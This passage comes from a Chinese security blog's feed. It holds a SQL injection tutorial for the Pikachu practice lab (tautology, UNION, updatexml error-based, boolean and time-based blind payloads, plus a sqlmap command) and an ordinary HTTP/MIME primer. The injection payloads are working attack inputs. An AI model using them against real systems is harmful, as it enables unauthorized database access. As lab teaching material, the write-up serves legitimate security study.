id="手动注入-1"><a href="#手动注入-1" class="headerlink" title="手动注入"></a>手动注入</h3><h4 id="基于永真语句的手动注入-1"><a href="#基于永真语句的手动注入-1" class="headerlink" title="基于永真语句的手动注入"></a>基于永真语句的手动注入</h4><p>SQL语句，与数字相比多了引号</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/y"></p><p>那么这种手动注入就需要构造闭合，假设我们让$name&#x3D;admin’  or 1&#x3D;1#,那么后天的sql语句就会变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,email <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<span class="hljs-string">&#x27;</span><br><span class="hljs-string">其中#是注释符，相当于把&#x27;</span>注释了，常见的注释符还有‘<span class="hljs-comment">--’，使用这个时要用空格隔开</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/z"></p><h4 id="基于union的联合注入"><a href="#基于union的联合注入" class="headerlink" title="基于union的联合注入"></a>基于union的联合注入</h4><p>以下操作都是判断完字段后，判断字段的方法与数字型类似，要构造闭合而已</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;union select database(),database()#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/1"></p><p>其他操作也与数字类似，这里不重复说明</p><h3 id="sqlmap注入-GET"><a href="#sqlmap注入-GET" class="headerlink" title="sqlmap注入(GET)"></a><strong>sqlmap注入</strong>(GET)</h3><p>因为get传参可以在url上操作，所以不需要保存报文来注入，当然这种保存请求报文的方式也可以用于GET,但这里介绍另一种方法</p><p>爆库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://125.217.53.64/pikachu/vul/sqli/sqli_str.php?name=a&amp;submit=%E6%9F%A5%E8%AF%A2&quot; <span class="hljs-comment">--current-db</span><br>#<span class="hljs-operator">-</span>u参数就是url<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/2"></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/3"></p><p>其他操作与次类似，这里不重复</p><h2 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h2><h3 id="手动注入-2"><a href="#手动注入-2" class="headerlink" title="手动注入"></a>手动注入</h3><h4 id="基于永真语句的手动注入-2"><a href="#基于永真语句的手动注入-2" class="headerlink" title="基于永真语句的手动注入"></a>基于永真语句的手动注入</h4><p>SQL语句，这次的闭合时是分号和百分号，原理一致，构造闭合</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/4"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-operator">%</span><span class="hljs-string">&#x27; or 1=1#</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/5"></p><h4 id="基于union的联合注入-1"><a href="#基于union的联合注入-1" class="headerlink" title="基于union的联合注入"></a>基于union的联合注入</h4><p>以下操作在已判断完字段的情况下</p><p>爆库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-operator">%</span><span class="hljs-string">&#x27; union select database(),database(),database()#</span><br><span class="hljs-string">#这里字段为3</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/6"></p><p>其他操作与他类似，不重复</p><h3 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h3><p>直接用上面的即可，不讲了</p><h2 id="update-insert"><a href="#update-insert" class="headerlink" title="update&amp;insert"></a>update&amp;insert</h2><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>SQL语句,insert 的SQL语句有两个，可以直接插入，也可以写入参数名进行插入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name(username,pw,sex,phonenum,email,address) <span class="hljs-keyword">values</span>(‘’ ‘’ ‘’ ‘’ ‘’)<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name <span class="hljs-keyword">values</span>()<br></code></pre></td></tr></table></figure><p>pikachu的例子是第一个</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/7"></p><p>我们传入的参数其实都在values里面，所以这里我们就单独分析这个</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;&#123;$getdata[&#x27;</span>username<span class="hljs-string">&#x27;]&#125;&#x27;</span>,md5(<span class="hljs-string">&#x27;&#123;$getdata[&#x27;</span>password<span class="hljs-string">&#x27;]&#125;&#x27;</span>),<span class="hljs-string">&#x27;&#123;$getdata[&#x27;</span>sex<span class="hljs-string">&#x27;]&#125;&#x27;</span>,<span class="hljs-string">&#x27;&#123;$getdata[&#x27;</span>phonenum<span class="hljs-string">&#x27;]&#125;&#x27;</span>,<span class="hljs-string">&#x27;&#123;$getdata[&#x27;</span>email<span class="hljs-string">&#x27;]&#125;&#x27;</span>,<span class="hljs-string">&#x27;&#123;$getdata[&#x27;</span><span class="hljs-keyword">add</span><span class="hljs-string">&#x27;]&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>假设传入参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>avsfd<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span>sdfavsdv<span class="hljs-operator">&amp;</span>sex<span class="hljs-operator">=</span>asfb<span class="hljs-operator">&amp;</span>phonenum<span class="hljs-operator">=</span>abfs<span class="hljs-operator">&amp;</span>email<span class="hljs-operator">=</span>abvsd<span class="hljs-operator">&amp;</span><span class="hljs-keyword">add</span><span class="hljs-operator">=</span>abwr<span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>submit<br></code></pre></td></tr></table></figure><p>最后的sql语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;avsfd&#x27;</span>,<span class="hljs-string">&#x27;sdfavsdv&#x27;</span>,<span class="hljs-string">&#x27;asfb&#x27;</span>,<span class="hljs-string">&#x27;abfs&#x27;</span>,<span class="hljs-string">&#x27;abvsd&#x27;</span>,<span class="hljs-string">&#x27;abwr&#x27;</span>)<br></code></pre></td></tr></table></figure><p>如果传入一些恶意构造的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>xixi<span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">666666</span><span class="hljs-operator">&amp;</span>sex<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>phonenum<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>email<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span><span class="hljs-keyword">add</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>形成的语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;xixi&#x27;</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;666666&#x27;</span>,’,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这里其实就是一个类似字符型的sql注入</p><h4 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>xixi<span class="hljs-string">&#x27; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">666666</span><span class="hljs-operator">&amp;</span>sex<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>phonenum<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>email<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span><span class="hljs-keyword">add</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>其他的操作其实就是把基于报错的注入与这个结合起来，这里不继续了</p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>SQL语句</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name<br><span class="hljs-keyword">VALUES</span> (value1,value2,value3,...);<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/8"></p><p>这个跟insert 差不多，payload都大差不差，这里直接给了</p><h4 id="爆库-1"><a href="#爆库-1" class="headerlink" title="爆库"></a>爆库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sex<span class="hljs-operator">=</span>nv<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) #&amp;phonenum=123&amp;add=123&amp;email=123%40123.com&amp;submit=submit</span><br></code></pre></td></tr></table></figure><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><p>SQL语句</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/9"></p><p>这个sql语句本质上就是一个数字型sql注入，具体的操作参考前面，这里就举一个例子</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">60</span> or updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/11"></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/10"></p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>基于boolian盲注主要表现症状：</p><ol><li><p>没有报错</p></li><li><p>只显示两种情况，不管输入对错</p></li></ol><p>输入kobe’ and 1&#x3D;1#时，能正确显示</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/12"></p><p>输入kobe’ and 1&#x3D;2#时，没有正确输出</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/13"></p><p>说明这个时存在注入的，并且是所有语句都是真的时候才能正确回显</p><p>我们可以利用，length(),substr(),ascii()等等，来拼接，根据回显来一个一个来判断和获取字符</p><p>Length()函数：用来返回长度</p><p>Substr()函数可以截取一个字符子串</p><p>ascii()是用来返回ascii码的</p><p>接下来对数据库名称的第一个字符进行判断</p><p>正常来说是要爆破的，为了方便说明就直接用了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">kobe<span class="hljs-string">&#x27; and ascii(substr(database(),1,1))=112#  //ascii表 112对应p</span><br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/14"></p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>基于时间的盲注比布尔盲注要更难一些，因为他只有一个回显，没有办法通过回显来判断是否存在注入了，那么这时候就可以通过回显返回的时间来判断</p><p>输出命令</p><p>kobe’ and sleep(5)#</p><p>发现过来5秒才回显，说明是存在注入漏洞的</p><p>那么就要思考怎么进行攻击，可以通过一个if 语句，条件是返回的数据库名称的某个字符和我们爆破的相等，然后执行sleep(5),如果执行了sleep(5)就说明字符是相等的，就能泄露信息了</p><p>输入命令</p><p>kobe’and if((substr(database(),1,1))&#x3D;’p’,sleep(5),null)</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/15"></p><p>页面5秒后回显，说明数据库名称的第一个字符就是p</p><p>由于手工进行盲注的话很麻烦，所以这个还是推荐sqlmap直接一把梭，当然原理还是需要理解的</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Http学习</title>
      <link href="/2024/11/23/Http%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/23/Http%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Http学习"><a href="#Http学习" class="headerlink" title="Http学习"></a>Http学习</h1><h3 id="HTTP和HTTPS的区别"><a href="#HTTP和HTTPS的区别" class="headerlink" title="HTTP和HTTPS的区别"></a>HTTP和HTTPS的区别</h3><p><strong>HTTP（超文本传输协议，Hypertext Transfer Protocol）</strong>是一种用于从网络传输超文本到本地浏览器的传输协议。它定义了客户端与服务器之间请求和响应的格式。HTTP 工作在 TCP&#x2F;IP 模型之上，通常使用端口 <strong>80</strong>。</p><p><strong>HTTPS（超文本传输安全协议，Hypertext Transfer Protocol Secure）</strong>是 HTTP 的安全版本，它在 HTTP 下增加了 SSL&#x2F;TLS 协议，提供了数据加密、完整性校验和身份验证。HTTPS 通常使用端口 <strong>443</strong>。</p><p>主要区别如下：</p><ul><li><strong>加密</strong>：<ul><li><strong>HTTP</strong>：数据传输过程中不加密，容易被截获和篡改。</li><li><strong>HTTPS</strong>：使用SSL&#x2F;TLS协议对传输的数据进行加密，保护数据传输过程中的安全性。</li></ul></li><li><strong>端口</strong>：<ul><li><strong>HTTP</strong>：默认使用端口80。</li><li><strong>HTTPS</strong>：默认使用端口443。</li></ul></li><li><strong>安全性</strong>：<ul><li><strong>HTTP</strong>：不提供数据加密，安全性较低。</li><li><strong>HTTPS</strong>：提供数据加密和完整性校验，安全性较高。</li></ul></li><li><strong>证书</strong>：<ul><li><strong>HTTP</strong>：不需要证书。</li><li><strong>HTTPS</strong>：需要SSL证书来启用加密，并验证服务器的身份。</li></ul></li><li><strong>性能</strong>：<ul><li><strong>HTTP</strong>：由于不加密数据，性能略高于HTTPS。</li><li><strong>HTTPS</strong>：由于需要进行加密和解密，可能会有一定的性能开销。</li></ul></li><li>**搜索引擎优化(SEO)**：<ul><li><strong>HTTP</strong>：搜索引擎可能会对没有使用HTTPS的网站进行降权。</li><li><strong>HTTPS</strong>：搜索引擎倾向于优先索引和展示使用HTTPS的网站。</li></ul></li><li><strong>浏览器显示</strong>：<ul><li><strong>HTTP</strong>：在大多数现代浏览器中，HTTP网站通常显示为”不安全”。</li><li><strong>HTTPS</strong>：浏览器会显示一个锁形图标，表示网站是安全的。</li></ul></li><li><strong>成本</strong>：<ul><li><strong>HTTP</strong>：通常免费。</li><li><strong>HTTPS</strong>：需要购买SSL证书，可能会有一定的成本。</li></ul></li><li><strong>应用场景</strong>：<ul><li><strong>HTTP</strong>：适用于不需要传输敏感信息的网站，如新闻网站、博客等。</li><li><strong>HTTPS</strong>：适用于需要传输敏感信息的网站，如网上银行、在线购物、电子邮件等。</li></ul></li></ul><h3 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h3><h4 id="客户端请求消息"><a href="#客户端请求消息" class="headerlink" title="客户端请求消息"></a>客户端请求消息</h4><ul><li><p><strong>请求行</strong>（Request Line）：</p><ul><li><strong>方法</strong>：如 GET、POST、PUT、DELETE等，指定要执行的操作。</li><li><strong>请求 URI</strong>（统一资源标识符）：请求的资源路径，通常包括主机名、端口号（如果非默认）、路径和查询字符串。</li><li><strong>HTTP 版本</strong>：如 HTTP&#x2F;1.1 或 HTTP&#x2F;2。</li></ul><p>请求行的格式示例：<code>GET /index.html HTTP/1.1</code></p></li><li><p><strong>请求头</strong>（Request Headers）：</p><ul><li>包含了客户端环境信息、请求体的大小（如果有）、客户端支持的压缩类型等。</li><li>常见的请求头包括<code>Host</code>、<code>User-Agent</code>、<code>Accept</code>、<code>Accept-Encoding</code>、<code>Content-Length</code>等。</li><li>Host：资源所在的主机的ip和端口</li><li>User-Agent：告知服务器发起请求的客户端软件类型，包括浏览器的信息和操作系统。例如，它可以包含浏览器的名称、版本、操作系统等信息，帮助服务器优化响应内容</li><li>Accept：指示客户端能处理的内容类型。例如，可以是<code>text/html</code>、<code>application/json</code>等</li><li>Accept-Encoding：告知Accept-Encoding的编码形式</li><li>Upgrade-Insecure-Requests：告知服务器把希望把不安全的请求提升为安全的请求</li></ul></li><li><p><strong>空行</strong>：</p><ul><li>请求头和请求体之间的分隔符，表示请求头的结束。</li></ul></li><li><p><strong>请求体</strong>（可选）：</p><ul><li>在某些类型的HTTP请求（如 POST 和 PUT）中，请求体包含要发送给服务器的数据。</li></ul></li></ul><h4 id="服务端响应消息"><a href="#服务端响应消息" class="headerlink" title="服务端响应消息"></a>服务端响应消息</h4><p>HTTP 响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p><p><img src="/img/Http%E5%AD%A6%E4%B9%A0/a"></p><ul><li><p><strong>状态行</strong>（Status Line）：</p><ul><li><strong>HTTP 版本</strong>：与请求消息中的版本相匹配。</li><li><strong>状态码</strong>：三位数，表示请求的处理结果，如 200 表示成功，404 表示未找到资源。</li><li><strong>状态信息</strong>：状态码的简短描述。</li></ul><p>状态行的格式示例：<code>HTTP/1.1 200 OK</code></p></li><li><p><strong>响应头</strong>（Response Headers）：</p><ul><li>包含了服务器环境信息、响应体的大小、服务器支持的压缩类型等。</li><li>常见的响应头包括<code>Content-Type</code>、<code>Content-Length</code>、<code>Server</code>、<code>Set-Cookie</code>等。</li></ul></li><li><p><strong>空行</strong>：</p><ul><li>响应头和响应体之间的分隔符，表示响应头的结束。</li></ul></li><li><p><strong>响应体</strong>（可选）：</p><ul><li>包含服务器返回的数据，如请求的网页内容、图片、JSON数据等。</li></ul></li></ul><table><thead><tr><th>HTTP 响应头信息</th><th></th><th></th></tr></thead><tbody><tr><td>响应头信息（英文）HTTP 响应头信息是服务器在响应客户端的HTTP请求时发送的一系列头字段，它们提供了关于响应的附加信息和服务器的指令。</td><td>响应头信息（中文）</td><td>描述</td></tr><tr><td>Date以下是一些常见的 HTTP 响应头信息：</td><td>日期</td><td>响应生成的日期和时间。例如：Wed, 18 Apr 2024 12:00:00 GMT</td></tr><tr><td>Server</td><td>服务器</td><td>服务器软件的名称和版本。例如：Apache&#x2F;2.4.1 (Unix)</td></tr><tr><td>Content-Type</td><td>内容类型</td><td>响应体的媒体类型（MIME类型），如<code>text/html; charset=UTF-8</code>, <code>application/json</code>等。</td></tr><tr><td>Content-Length</td><td>内容长度</td><td>响应体的大小，单位是字节。例如：3145</td></tr><tr><td>Content-Encoding</td><td>内容编码</td><td>响应体的压缩编码，如 <code>gzip</code>, <code>deflate</code>等。</td></tr><tr><td>Content-Language</td><td>内容语言</td><td>响应体的语言。例如：zh-CN</td></tr><tr><td>Content-Location</td><td>内容位置</td><td>响应体的 URI。例如：&#x2F;index.html</td></tr><tr><td>Content-Range</td><td>内容范围</td><td>响应体的字节范围，用于分块传输。例如：bytes 0-999&#x2F;8000</td></tr><tr><td>Cache-Control</td><td>缓存控制</td><td>控制响应的缓存行为, 如 no-cache 表示必须重新请求。</td></tr><tr><td>Connection</td><td>连接</td><td>管理连接的选项，如<code>keep-alive</code>或<code>close</code>，keep-alive 表示连接不会在传输后关闭。。</td></tr><tr><td>Set-Cookie</td><td>设置 Cookie</td><td>设置客户端的 cookie。例如：sessionId&#x3D;abc123; Path&#x3D;&#x2F;; Secure</td></tr><tr><td>Expires</td><td>过期时间</td><td>响应体的过期日期和时间。例如：Thu, 18 Apr 2024 12:00:00 GMT</td></tr><tr><td>Last-Modified</td><td>最后修改时间</td><td>资源最后被修改的日期和时间。例如：Wed, 18 Apr 2024 11:00:00 GMT</td></tr><tr><td>ETag</td><td>实体标签</td><td>资源的特定版本的标识符。例如：”33a64df551425fcc55e6”</td></tr><tr><td>Location</td><td>位置</td><td>用于重定向的 URI。例如：&#x2F;newresource</td></tr><tr><td>Pragma</td><td>实现特定的指令</td><td>包含实现特定的指令，如 <code>no-cache</code>。</td></tr><tr><td>WWW-Authenticate</td><td>认证信息</td><td>认证信息，通常用于HTTP认证。例如：Basic realm&#x3D;”Access to the site”</td></tr><tr><td>Accept-Ranges</td><td>接受范围</td><td>指定可接受的请求范围类型。例如：bytes</td></tr><tr><td>Age</td><td>经过时间</td><td>响应生成后经过的秒数，从原始服务器生成到代理服务器。例如：24</td></tr><tr><td>Allow</td><td>允许方法</td><td>列出资源允许的 HTTP 方法 。例如：GET, POST，HEAD等</td></tr><tr><td>Vary</td><td>变化</td><td>告诉下游代理如何使用响应头信息来确定响应是否可以从缓存中获取。例如：Accept</td></tr><tr><td>Strict-Transport-Security</td><td>严格传输安全</td><td>指示浏览器仅通过 HTTPS 与服务器通信。例如：max-age&#x3D;31536000; includeSubDomains</td></tr><tr><td>X-Frame-Options</td><td>框架选项</td><td>控制页面是否允许在框架中显示，防止点击劫持攻击。例如：SAMEORIGIN</td></tr><tr><td>X-Content-Type-Options</td><td>内容类型选项</td><td>指示浏览器不要尝试猜测资源的 MIME 类型。例如：nosniff</td></tr><tr><td>X-XSS-Protection</td><td>XSS保护</td><td>控制浏览器的 XSS 过滤和阻断。例如：1; mode&#x3D;block</td></tr><tr><td>Public-Key-Pins</td><td>公钥固定</td><td>HTTP 头信息，用于HTTP公共密钥固定（HPKP），一种安全机制，用于防止中间人攻击。例如：pin-sha256&#x3D;”base64+primarykey”; pin-sha256&#x3D;”base64+backupkey”; max-age&#x3D;expireTime</td></tr></tbody></table><h4 id="HTTP-content-type"><a href="#HTTP-content-type" class="headerlink" title="HTTP content-type"></a>HTTP content-type</h4><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p><p>Content-Type 标头告诉客户端实际返回的内容的内容类型。</p><p>语法格式：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Content-<span class="hljs-keyword">Type</span>: text/html; charset=utf-<span class="hljs-number">8</span><br>Content-<span class="hljs-keyword">Type</span>: multipart/<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; boundary=something<br></code></pre></td></tr></table></figure><p>实例：</p><p><img src="/img/Http%E5%AD%A6%E4%B9%A0/b"></p><h5 id="常见的媒体格式类型如下："><a href="#常见的媒体格式类型如下：" class="headerlink" title="常见的媒体格式类型如下："></a>常见的媒体格式类型如下：</h5><ul><li>text&#x2F;html ： HTML格式</li><li>text&#x2F;plain ：纯文本格式</li><li>text&#x2F;xml ： XML格式</li><li>image&#x2F;gif ：gif图片格式</li><li>image&#x2F;jpeg ：jpg图片格式</li><li>image&#x2F;png：png图片格式</li></ul><h5 id="以application开头的媒体格式类型："><a href="#以application开头的媒体格式类型：" class="headerlink" title="以application开头的媒体格式类型："></a>以application开头的媒体格式类型：</h5><ul><li>application&#x2F;xhtml+xml ：XHTML格式</li><li>application&#x2F;xml： XML数据格式</li><li>application&#x2F;atom+xml ：Atom XML聚合格式</li><li>application&#x2F;json： JSON数据格式</li><li>application&#x2F;pdf：pdf格式</li><li>application&#x2F;msword ： Word文档格式</li><li>application&#x2F;octet-stream ： 二进制流数据（如常见的文件下载）</li><li>application&#x2F;x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key&#x2F;value格式发送到服务器（表单默认的提交数据的格式）</li></ul><p>另外一种常见的媒体格式是上传文件之时使用的：</p><ul><li>multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li></ul><h4 id="MIME-类型"><a href="#MIME-类型" class="headerlink" title="MIME 类型"></a>MIME 类型</h4><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><h5 id="常见的-MIME-类型"><a href="#常见的-MIME-类型" class="headerlink" title="常见的 MIME 类型"></a>常见的 MIME 类型</h5><ul><li>超文本标记语言文本 <strong>.html、.html</strong>：<strong>text&#x2F;html</strong></li><li>普通文本 <strong>.txt</strong>： <strong>text&#x2F;plain</strong></li><li>RTF 文本 <strong>.rtf</strong>： <strong>application&#x2F;rtf</strong></li><li>GIF 图形 <strong>.gif</strong>： <strong>image&#x2F;gif</strong></li><li>JPEG 图形 <strong>.jpeg、.jpg</strong>： <strong>image&#x2F;jpeg</strong></li><li>au 声音文件 <strong>.au</strong>： <strong>audio&#x2F;basic</strong></li><li>MIDI 音乐文件 <strong>mid、.midi</strong>： <strong>audio&#x2F;midi、audio&#x2F;x-midi</strong></li><li>RealAudio 音乐文件 <strong>.ra、.ram</strong>： <strong>audio&#x2F;x-pn-realaudio</strong></li><li>MPEG 文件 <strong>.mpg、.mpeg</strong>： <strong>video&#x2F;mpeg</strong></li><li>AVI 文件 <strong>.avi</strong>： <strong>video&#x2F;x-msvideo</strong></li><li>GZIP 文件 <strong>.gz</strong>： <strong>application&#x2F;x-gzip</strong></li><li>TAR 文件 <strong>.tar</strong>： <strong>application&#x2F;x-tar</strong></li></ul><p>补充</p><p><img src="/img/Http%E5%AD%A6%E4%B9%A0/c"></p><p>request</p><p><img src="/img/Http%E5%AD%A6%E4%B9%A0/d"></p><p>response</p><p><img src="/img/Http%E5%AD%A6%E4%B9%A0/e"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><h2 id="菜鸟"><a href="#菜鸟" class="headerlink" title="菜鸟"></a><a href="https://www.runoob.com/http/http-tutorial.html">菜鸟</a></h2>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_force(HITCON training lab 11)</title>
      <link href="/2024/11/18/house-force/"/>
      <url>/2024/11/18/house-force/</url>
      
